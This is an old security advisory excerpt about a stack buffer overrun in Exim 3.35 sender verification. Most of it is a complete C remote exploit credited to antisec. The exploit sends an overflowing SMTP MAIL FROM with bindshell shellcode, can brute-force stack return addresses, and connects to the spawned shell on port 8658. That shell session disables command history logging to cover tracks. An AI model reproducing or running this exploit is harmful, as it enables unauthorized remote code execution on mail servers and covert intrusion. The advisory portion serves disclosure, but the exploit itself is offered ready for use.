source: http://www.securityfocus.com/bid/10290/info

Exim has been reported prone to a remotely exploitable stack-based buffer overrun vulnerability. 

This is exposed if sender verification has been enabled in the agent and may be triggered by a malicious e-mail. Exploitation may permit execution of arbitrary code in the content of the mail transfer agent.

This issue is reported in exist in Exim 3.35. Earlier versions may also be affected. 

It should be noted that the vulnerable functionality is not enabled in the default install, though some Linux/Unix distributions that ship the software may enable it.

/*
 * antisec presents 
 *
 * exim 3.35 remote exploit
 * written by newroot & nopfish
 * 
 * http://www.antisec.de
 *
 * greetz to mcb, ^sq , merith 
 * and the whole antisec.de team
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <signal.h>
#include <fcntl.h>
#include <errno.h>

#define CODING_STYLE "German"
#define VERSION "0.0.1 private"
#define AUTHOR  "newroot and nopfish"

#define OPT_VERBOSE	1	// 0001
#define OPT_BRUTE	2	// 0010
#define OPT_CHECK	4	// 0100

#define BUFSIZE		256
#define OVERSIZE	 44

#define PORT 25
#define HELO "HELO a\r\n"
#define FROM "MAIL FROM: "
#define RCPT "RCPT TO: postmaster@localhost\r\n"
#define DATA "DATA\r\n"
#define END  "\r\n\r\n.\r\n"
#define QUIT "QUIT\r\n"
#define ATTACK_HOST "@localho\r\n"

#define STACK_START	0xbfffffff
#define STACK_END	0xbfff0000

extern int errno;
extern int optind, opterr;
extern char *optarg;
unsigned long int opt_flags;		// options

unsigned int steps     = 15;		// steps for bruteforcing
unsigned int alignment =  0;		// alignment
unsigned int timeout   =  5;		// time between bruteforce
int nutcase	       = 35;


unsigned char shellcode[] =
// antisec bindshell 8658 / filters out illegal chars
"\x31\xc0\x31\xdb\xf7\xe3\xb0\x66\x53\x43\x53\x43\x53\x89\xe1\x4b"
"\xcd\x80\x89\xc7\x52\x66\x68\x21\xd2\x43\x66\x53\x89\xe1\x52\xb2"
"\x70\x80\xea\x60\x89\xd0\x5a\x50\x51\x57\x89\xe1\xb0\x66\xcd\x80"
"\xb0\x66\xb3\x84\x80\xeb\x80\xcd\x80\x50\x50\x57\x89\xe1\x43\xb0"
"\x66\xcd\x80\x89\xd9\x89\xc3\xb0\x3f\x49\xcd\x80\x41\xe2\xf8\x51"
"\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x51\x53\x89\xe1"
"\xfe\xc0\xfe\xc0\xfe\xc0\xfe\xc0\xfe\xc0\xfe\xc0\xfe\xc0\xfe\xc0"
"\xfe\xc0\xfe\xc0\xfe\xc0\xcd\x80";


struct targets {
	        unsigned char desc[BUFSIZE];
	        unsigned long addr;
} target[] = {
	{ "Debian 3.0 unstable(woody)",
	   0xbffff098
	},
	{ "Testing",
           0x5c5c5c5c
        },
        { 0x00, 0x00 }
};

void banner (char *);
void verbose (const char *, ...);
void fatal(char *);
void error (const char *, ...);
int ussage (char *);
void print_targets ();
int exploit (char *host, int port, struct targets target);
char *xp_create (long ret); 
void xp_destroy (char *payload); 
int xp_send (char *host, int port, char *payload);
int connect_host(char * host,int port);
void shell(int thesock);



int main (int argc, char **argv) {
	int c;
	int port;
	int target_nr;		
	unsigned long adress = 0x00;

	banner(argv[0]);

	if (argc < 2) {
		return ussage (argv[0]);
	}

	port = PORT; target_nr = -1;
	while ( (c = getopt (argc, argv, "o:n:x:a:p:t:s:bchv")) != -1 ) {
		switch (c) {
			case 'b':
				opt_flags |= OPT_BRUTE;
			break;

			case 'p':
				port = atoi(optarg);
			break;

			case 'x':
				adress  = strtoll (optarg, NULL, 16);
			break;

			case 'a':
				alignment = atoi(optarg);
			break;

			case 't':
				target_nr = atoi(optarg);
			break;

			case 'o':
				timeout = atoi(optarg);
			break;

			case 's':
				steps = atoi(optarg);
			break;

			case 'n':
				nutcase = atoi(optarg);
			break;

			case 'v':
				opt_flags |= OPT_VERBOSE;
			break;

			case 'c':
				opt_flags |= OPT_CHECK;
			break;

			case 'h':
			default:
				return ussage(argv[0]);
			break;
		}
	}

	if (target_nr == 0) {
		print_targets ();
		return EXIT_SUCCESS;
	} else if (target_nr == -1) {
		target_nr = 1;
	}
	if (adress != 0x00) {
		target[target_nr-1].addr = adress;
	}

	exploit (argv[argc-1], port, target[target_nr-1]);

	return EXIT_SUCCESS;
}

void banner (char *args) {
	char line[BUFSIZ+1];
	int i, j;

	memset ((void *)line, 0x00, BUFSIZ);
	if (args[0] == '.' && args[1] == '/') {
		snprintf (line, BUFSIZ, "%s - v%s / written by %s", (args+2), VERSION, AUTHOR);
	} else {
		snprintf (line, BUFSIZ, "%s - v%s / written by %s", args, VERSION, AUTHOR);
	}
	fprintf (stderr, "\nwww.antisec.de gives you:\n");
	fprintf (stderr, "%s a remote exim 3.35 exploit\n\n", args+2);
	fprintf(stderr, "%s\n", line);
	j = strlen (line);
	memset (line, 0x00, BUFSIZ);
	for (i=0; i< j && i < BUFSIZ; i++) {
		line[i] = '~';
	}
	fprintf(stderr, "%s\n", line);

}

void verbose(const char *fmt, ...) {
	va_list args;
	 if (opt_flags & OPT_VERBOSE) { 
		 va_start(args, fmt);
		 vfprintf(stderr, fmt, args);
		 va_end(args);
	 }
}

void fatal(char *msg) {
	perror (msg);
	exit(EXIT_FAILURE);
}

void error (const char *fmt, ...) {
	va_list args;
	 if (opt_flags & OPT_VERBOSE) { 
		 va_start(args, fmt);
		 vfprintf(stderr, fmt, args);
		 va_end(args);
	 }
	exit(EXIT_FAILURE);
}

int ussage (char *args) {
	fprintf (stderr, "Ussage %s [options] <target host>\n", args);
	fprintf (stderr, "\t-t <num>\t target (0 for listing)\n");
	fprintf (stderr, "\t-x <address>\t give your own adress in hex (0xbffffc03)\n");
	fprintf (stderr, "\t-o <timeout>\t time between bruteforce attempts (default 5)\n");
	fprintf (stderr, "\t-s <steps>\t steps for bruteforce (default 15)\n");
	fprintf (stderr, "\t-p <port>\t use an other port then 25\n");
	fprintf (stderr, "\t-n <nutcase>\t default is 35\n");
	fprintf (stderr, "\t-a <align>\t alignment\n");
	fprintf (stderr, "\t-b\t\t bruteforce mode\n");
	fprintf (stderr, "\t-c\t\t check if target is vulnable\n");
	//fprintf (stderr, "\t-v\t\t\t verbose output\n");
	fprintf (stderr, "\t-h\t\t this help :)\n");
	return EXIT_FAILURE;
}

void print_targets () {
        int i;

        fprintf (stdout, "Supported targets:\n");
        for (i=0; target[i].addr != 0; i++) {
                fprintf (stdout, "\t%i) - %s\n", i+1,  target[i].desc);
        }
}


int exploit (char *host, int port, struct targets target) {
	char *payload;
	int thesock;
	long ret;

	if (opt_flags & OPT_BRUTE) {
		for (ret = STACK_START; ret > STACK_END; ret-=steps) {
			fprintf (stdout, "[+] Trying %#x\n", ret);
			payload = xp_create (target.addr);
			xp_send (host, port, payload);
			sleep(timeout);
			thesock = connect_host (host, 8658);
			if (thesock == -1) {
				fprintf (stdout, "[-] Exploit failed!\n");
				xp_destroy (payload);
			} else {
				fprintf (stdout, "[+] Exploit success!\n");
				fprintf (stdout, "[+] Waiting for shell\n");
				shell (thesock);
				break;
			}
		}
	} else {
		if (opt_flags & OPT_CHECK) {
			fprintf (stdout, "[+] Checking for vulnability\n");
		} else {
			fprintf (stdout, "[+] Trying %#x\n", target.addr);
		}

		payload = xp_create (target.addr);
		xp_send (host, port, payload);
		sleep(2);
		thesock = connect_host (host, 8658);
		if (thesock == -1) {
			fprintf (stdout, "[-] Exploit failed!\n");
			xp_destroy (payload);
			return EXIT_FAILURE;
		} else {
			fprintf (stdout, "[+] Exploit success!\n");
			fprintf (stdout, "[+] Waiting for shell\n");
			sleep(1);
			shell (thesock);
		}
	}
	return 0;
}

char * xp_create (long ret) {
	unsigned char *payload;
	long *longptr;
	int i;
	
	payload = NULL;
	payload = (unsigned char *) malloc (BUFSIZE+OVERSIZE+strlen(ATTACK_HOST)+1);
	if (payload == NULL) {
		fprintf (stderr, "[-] Can't allocate enugh memory!\n");
		exit (EXIT_FAILURE);
	}

	memset (payload, 0x00, BUFSIZE+OVERSIZE+strlen(ATTACK_HOST));
	if (OPT_CHECK & opt_flags) {
		memset (payload, 0x41, BUFSIZE+OVERSIZE);
	} else {
		memset (payload, 0x90, BUFSIZE+OVERSIZE);
		memcpy (payload+BUFSIZE-strlen(shellcode)-nutcase, shellcode, strlen(shellcode)); 
		(unsigned char *)longptr = payload+BUFSIZE;
		for (i=0+alignment; i < OVERSIZE; i+=4) {
			*(longptr++) = ret;
		}
	}
	memcpy (payload+BUFSIZE+OVERSIZE, ATTACK_HOST, strlen (ATTACK_HOST));
	
	return payload;
}

int xp_send (char *host, int port, char *payload) {
	int thesock;
	char buffer[BUFSIZ];
	struct timeval tv;
	fd_set rfds, wfds;
	int ret;
	
	thesock = connect_host (host, port);
	if (thesock == -1) {
		fprintf (stderr, "[-] Can't connect to target %s\n", host);
		exit (EXIT_FAILURE);
	} else {
		fprintf (stdout, "[+] Connected.\n");
	}

	memset (buffer, 0x00, BUFSIZ);
#ifdef DEBUG
	sleep(4);
#endif

	// reading banner
	//fprintf (stderr, "reading banner...\n");
	memset (buffer, 0x00, BUFSIZ);
	ret = recv (thesock, buffer, sizeof (buffer), 0);
	//fprintf (stdout, "%s\n", buffer);

	//sending helo
	//fprintf (stderr, "sending HELO...\n");
	memset (buffer, 0x00, BUFSIZ);
        ret = send (thesock, HELO, strlen(HELO), 0);
        ret = recv (thesock, buffer, sizeof (buffer), 0);
	//fprintf (stdout, "%s\n", buffer);
	
	// sending mail from:
	//fprintf (stderr, "sending MAIL FROM:...\n");
	memset (buffer, 0x00, BUFSIZ);
	ret = send (thesock, FROM, strlen (FROM), 0);
        ret = send (thesock, payload, strlen (payload), 0);
        ret = recv (thesock, buffer, sizeof (buffer), 0);
	//fprintf (stdout, "%s\n", buffer);


	// sending rcpt to:
	//fprintf (stderr, "sending RCPT TO:...\n");
	memset (buffer, 0x00, BUFSIZ);
	ret = send (thesock, RCPT, strlen (RCPT), 0);
        ret = recv (thesock, buffer, sizeof (buffer), 0);
	//fprintf (stdout, "%s\n", buffer);

	FD_ZERO(&rfds);
	FD_SET(thesock, &rfds);
	tv.tv_sec = 7;
	tv.tv_usec = 0;

	// data
	//fprintf (stderr, "sending DATA:...\n");
	memset (buffer, 0x00, BUFSIZ);
	ret = send (thesock, DATA, strlen (DATA), 0);
	select (thesock+1, &rfds, NULL, NULL, &tv);
	if (FD_ISSET(thesock, &rfds)) {
        	ret = recv (thesock, buffer, sizeof (buffer), 0);
		//fprintf (stdout, "%s\n", buffer);
	} else {
		close (thesock);
		return -1;
	}
	
	FD_ZERO(&rfds);
	FD_SET(thesock, &rfds);
	tv.tv_sec = 7;
	tv.tv_usec = 0;

	// end things
	//fprintf (stderr, "sending END THINGS:...\n");
	memset (buffer, 0x00, BUFSIZ);
	ret = send (thesock, END, strlen (END), 0);
	select (thesock+1, &rfds, NULL, NULL, &tv);
	if (!FD_ISSET(thesock, &rfds)) {
		fprintf (stdout, "[+] Offset seems good ! if the next hit fails\n");
		fprintf (stdout, "[+] try to decrement THIS adddress by 5 or 10!\n");
		close (thesock);
		return -1;
	}
        ret = recv (thesock, buffer, sizeof (buffer), 0);
	if (opt_flags & OPT_CHECK) {
		if (buffer[0] == 0x00) {
			fprintf (stdout, "[+] Host seams vulnable!\n");
		} else {
			fprintf (stdout, "[-] Host is not vulnable!\n");
		}
		close (thesock);
		exit (EXIT_SUCCESS);
	}
	//fprintf (stdout, "%s\n", buffer);
        ret = send (thesock, QUIT, strlen (QUIT), 0);

	close (thesock);
	return ret;
}

void  xp_destroy (char *payload) {
	free (payload);
}

int connect_host(char * host,int port)
{
        struct sockaddr_in addr;
        struct hostent *he;
	int ret;
        int sock;

        he=gethostbyname(host);

        if (he==NULL) return -1;
        sock=socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock==-1) return -1;

        memcpy(&addr.sin_addr, he->h_addr, he->h_length);

        addr.sin_family=AF_INET;
        addr.sin_port=htons(port);

	ret = connect(sock, (struct sockaddr *)&addr, sizeof(addr));

        if(ret == 0 ) {
                return sock;
	} else {
		return -1;
	}

	return -1;
}

void shell(int thesock)         
{                       
        int n;
        fd_set  fds;            
        char buff[1024], *cmd="unset HISTFILE; export HISTFILE=/dev/zero;"
			      "export TERM=vt100;/bin/uname -a;/usr/bin/id;\n";
                        
        FD_ZERO(&fds);  
        FD_SET(thesock, &fds);
        FD_SET(0, &fds);

        send(thesock, cmd, strlen(cmd), 0);
        while(1) {
                FD_SET(thesock,&fds);
                FD_SET(0,&fds);
                        
                if(select(thesock+1,&fds, NULL, NULL, NULL)<0)
                        break;
                if( FD_ISSET(thesock, &fds) ) {
                        if(!(n=recv(thesock,buff,sizeof(buff),0))) {
                                exit(EXIT_FAILURE);
                        }
                        if (!write (1, buff, n))
                                break;
                }

                if ( FD_ISSET(0, &fds) ) {
                        n = read (0, buff, sizeof(buff));
                        if(n <= 0){
                                fprintf(stderr,"EOF\n");
                                exit(EXIT_FAILURE);
                        }
                        if(send(thesock,buff,n,0)<0) break;
                }
        }
        fprintf(stderr,"done.\n");
        exit(EXIT_SUCCESS);
}

